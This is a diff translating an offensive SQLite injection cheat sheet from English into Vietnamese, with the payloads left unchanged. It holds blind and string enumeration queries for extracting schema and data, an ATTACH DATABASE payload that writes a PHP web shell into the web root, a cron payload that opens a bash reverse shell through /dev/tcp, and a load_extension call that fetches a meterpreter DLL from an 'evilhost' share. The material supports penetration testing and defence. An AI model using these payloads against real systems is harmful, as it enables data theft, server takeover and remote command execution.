@@ -1,64 +1,68 @@
 # SQLite Injection
 
-> SQLite Injection  is a type of security vulnerability that occurs when an attacker can insert or "inject" malicious SQL code into SQL queries executed by an SQLite database. This vulnerability arises when user inputs are integrated into SQL statements without proper sanitization or parameterization, allowing attackers to manipulate the query logic. Such injections can lead to unauthorized data access, data manipulation, and other severe security issues.
+> **SQLite Injection** là một dạng lỗ hổng bảo mật xảy ra khi kẻ tấn công có thể chèn hoặc “inject” mã SQL độc hại vào các truy vấn SQL được thực thi bởi cơ sở dữ liệu SQLite. Lỗ hổng này xuất hiện khi dữ liệu đầu vào của người dùng được đưa trực tiếp vào câu lệnh SQL mà không được xử lý hoặc tham số hóa đúng cách, cho phép kẻ tấn công thao túng logic của truy vấn. Các cuộc tấn công SQL Injection có thể dẫn đến truy cập dữ liệu trái phép, thay đổi dữ liệu và nhiều vấn đề bảo mật nghiêm trọng khác.
 
 ## Summary
 
 * [SQLite Comments](#sqlite-comments)
 * [SQLite Enumeration](#sqlite-enumeration)
 * [SQLite String](#sqlite-string)
-    * [SQLite String Methodology](#sqlite-string-methodology)
+
+  * [SQLite String Methodology](#sqlite-string-methodology)
 * [SQLite Blind](#sqlite-blind)
-    * [SQLite Blind Methodology](#sqlite-blind-methodology)
-    * [SQLite Blind With Substring Equivalent](#sqlite-blind-with-substring-equivalent)
+
+  * [SQLite Blind Methodology](#sqlite-blind-methodology)
+  * [SQLite Blind With Substring Equivalent](#sqlite-blind-with-substring-equivalent)
 * [SQlite Error Based](#sqlite-error-based)
 * [SQlite Time Based](#sqlite-time-based)
 * [SQlite Remote Code Execution](#sqlite-remote-code-execution)
-    * [Attach Database](#attach-database)
-    * [Load_extension](#load_extension)
+
+  * [Attach Database](#attach-database)
+  * [Load_extension](#load_extension)
 * [SQLite File Manipulation](#sqlite-file-manipulation)
-    * [SQLite Read File](#sqlite-read-file)
-    * [SQLite Write File](#sqlite-write-file)
+
+  * [SQLite Read File](#sqlite-read-file)
+  * [SQLite Write File](#sqlite-write-file)
 * [References](#references)
 
 ## SQLite Comments
 
-| Description         | Comment |
-| ------------------- | ------- |
-| Single-Line Comment | `--`    |
-| Multi-Line Comment  | `/**/`  |
+| Mô tả              | Comment |
+| ------------------ | ------- |
+| Comment một dòng   | `--`    |
+| Comment nhiều dòng | `/**/`  |
 
 ## SQLite Enumeration
 
-| Description  | SQL Query                  |
-| ------------ | -------------------------- |
-| DBMS version | `select sqlite_version();` |
+| Mô tả          | SQL Query                  |
+| -------------- | -------------------------- |
+| Phiên bản DBMS | `select sqlite_version();` |
 
 ## SQLite String
 
 ### SQLite String Methodology
 
-| Description                                          | SQL Query                                                                                              |
-| ---------------------------------------------------- | ------------------------------------------------------------------------------------------------------ |
-| Extract Database Structure                           | `SELECT sql FROM sqlite_schema`                                                                        |
-| Extract Database Structure (sqlite_version > 3.33.0) | `SELECT sql FROM sqlite_master`                                                                        |
-| Extract Table Name                                   | `SELECT tbl_name FROM sqlite_master WHERE type='table'`                                                |
-| Extract Table Name                                   | `SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'` |
-| Extract Column Name                                  | `SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'`             |
-| Extract Column Name                                  | `SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');`                      |
-| Extract Column Name                                  | `SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'`                                     |
-| Extract Column Name                                  | `SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')`                                                   |
+| Mô tả                                                  | SQL Query                                                                                              |
+| ------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
+| Trích xuất cấu trúc Database                           | `SELECT sql FROM sqlite_schema`                                                                        |
+| Trích xuất cấu trúc Database (sqlite_version > 3.33.0) | `SELECT sql FROM sqlite_master`                                                                        |
+| Trích xuất tên Table                                   | `SELECT tbl_name FROM sqlite_master WHERE type='table'`                                                |
+| Trích xuất tên Table                                   | `SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'` |
+| Trích xuất tên Column                                  | `SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'`             |
+| Trích xuất tên Column                                  | `SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');`                      |
+| Trích xuất tên Column                                  | `SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'`                                     |
+| Trích xuất tên Column                                  | `SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')`                                                   |
 
 ## SQLite Blind
 
 ### SQLite Blind Methodology
 
-| Description             | SQL Query                                                                                                                                                                                              |
-| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
-| Count Number Of Tables  | `AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table`                                                                               |
-| Enumerating Table Name  | `AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number`                                                       |
-| Extract Info            | `AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')`                                                    |
-| Extract Info (order by) | `CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = HEX('some_char') THEN <order_element_1> ELSE <order_element_2> END` |
+| Mô tả                             | SQL Query                                                                                                                                                                                              |
+| --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| Đếm số lượng Table                | `AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table`                                                                               |
+| Liệt kê tên Table                 | `AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number`                                                       |
+| Trích xuất thông tin              | `AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')`                                                    |
+| Trích xuất thông tin (`order by`) | `CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = HEX('some_char') THEN <order_element_1> ELSE <order_element_2> END` |
 
 ### SQLite Blind With Substring Equivalent
 
@@ -84,7 +88,7 @@ AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 
 ### Attach Database
 
-This snippet shows how an attacker could abuse SQLite's `ATTACH DATABASE` feature to plant a web-shell on a server:
+Đoạn mã này minh họa cách kẻ tấn công có thể lạm dụng tính năng `ATTACH DATABASE` của SQLite để tạo một web shell trên máy chủ:
 
 ```sql
 ATTACH DATABASE '/var/www/shell.php' AS shell;
@@ -92,16 +96,16 @@ CREATE TABLE shell.pwn (dataz text);
 INSERT INTO shell.pwn (dataz) VALUES ('<?php system($_GET["cmd"]); ?>');--
 ```
 
-First, it tells SQLite to "treat" a PHP file as a writable SQLite database. Then it creates a table inside that file (which is actually the future web-shell). Finally it writes malicious PHP code into the file.
+Đầu tiên, nó yêu cầu SQLite “coi” một file PHP là một database có thể ghi. Sau đó, nó tạo một Table bên trong file đó — thực tế đây sẽ trở thành web shell trong tương lai. Cuối cùng, nó ghi mã PHP độc hại vào file.
 
-**Note:** Using `ATTACH DATABASE` to create a file comes with a drawback: SQLite will prepend its magic header bytes (`5351 4c69 7465 2066 6f72 6d61 7420 3300`, i.e., *"SQLite format 3"*). These bytes will corrupt most server-side scripts, but PHP is unusually tolerant: as long as a `<?php` tag appears anywhere in the file, the interpreter ignores any preceding garbage and executes the embedded code.
+**Note:** Việc sử dụng `ATTACH DATABASE` để tạo file có một nhược điểm: SQLite sẽ thêm các byte header đặc trưng của SQLite (`5351 4c69 7465 2066 6f72 6d61 7420 3300`, tức *"SQLite format 3"*). Các byte này sẽ làm hỏng phần lớn script phía server, nhưng PHP có khả năng xử lý khá đặc biệt: miễn là thẻ `<?php` xuất hiện ở bất kỳ vị trí nào trong file, PHP interpreter sẽ bỏ qua phần dữ liệu rác phía trước và thực thi đoạn code được nhúng.
 
 ```ps1
 file shell.php  
 shell.php: SQLite 3.x database, last written using SQLite version 3051000, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2
 ```
 
-If uploading a PHP web shell isn’t possible but the service runs with root privileges, an attacker can use the same technique to create a cron job that triggers a reverse shell:
+Nếu không thể upload PHP web shell nhưng service đang chạy với quyền `root`, kẻ tấn công có thể sử dụng kỹ thuật tương tự để tạo một cron job kích hoạt reverse shell:
 
 ```sql
 ATTACH DATABASE '/etc/cron.d/pwn.task' AS cron;
@@ -109,28 +113,28 @@ CREATE TABLE cron.tab (dataz text);
 INSERT INTO cron.tab (dataz) VALUES (char(10) || '* * * * * root bash -i >& /dev/tcp/127.0.0.1/4242 0>&1' || char(10));--
 ```
 
-This writes a new cron entry that runs every minute and connects back to the attacker.
+Điều này ghi thêm một cron entry mới, được thực thi mỗi phút và tạo kết nối quay trở lại máy của kẻ tấn công.
 
 ### Load_extension
 
-:warning: SQLite's ability to load external shared libraries (extensions) is disabled by default in most environments. When enabled, SQLite can load a compiled module using the `load_extension()` SQL function:
+:warning: Khả năng load các shared library bên ngoài của SQLite bị vô hiệu hóa theo mặc định trong hầu hết môi trường. Khi được bật, SQLite có thể load một module đã biên dịch thông qua hàm SQL `load_extension()`:
 
 ```sql
 SELECT load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
 ```
 
-In the sqlite3 command-line shell you can display runtime configuration with:
+Trong SQLite3 command-line shell, có thể hiển thị cấu hình runtime bằng:
 
 ```sql
 sqlite> .dbconfig
     load_extension on
 ```
 
-If you see `load_extension on` (or off), that indicates whether the shell's runtime currently permits loading shared-library extensions.
+Nếu thấy `load_extension on` hoặc `off`, điều đó cho biết runtime hiện tại của shell có cho phép load shared-library extension hay không.
 
-A SQLite extension is simply a native shared library,typically a `.so` file on Linux or a `.dll` file on Windows, that exposes a special initialization function. When the extension is loaded, SQLite calls this function to register any new SQL functions, virtual tables, or other features provided by the module.
+Một SQLite extension đơn giản là một native shared library, thường là file `.so` trên Linux hoặc `.dll` trên Windows, cung cấp một hàm khởi tạo đặc biệt. Khi extension được load, SQLite gọi hàm này để đăng ký các SQL function, virtual table hoặc những tính năng khác do module cung cấp.
 
-To compile a loadable extension on Linux, you can use:
+Để biên dịch một loadable extension trên Linux, có thể sử dụng:
 
 ```ps1
 gcc -g -fPIC -shared demo.c -o demo.so
@@ -140,7 +144,7 @@ gcc -g -fPIC -shared demo.c -o demo.so
 
 ### SQLite Read File
 
-SQLite does not support file I/O operations by default.
+SQLite không hỗ trợ các thao tác I/O trên file theo mặc định.
 
 ### SQLite Write File
 
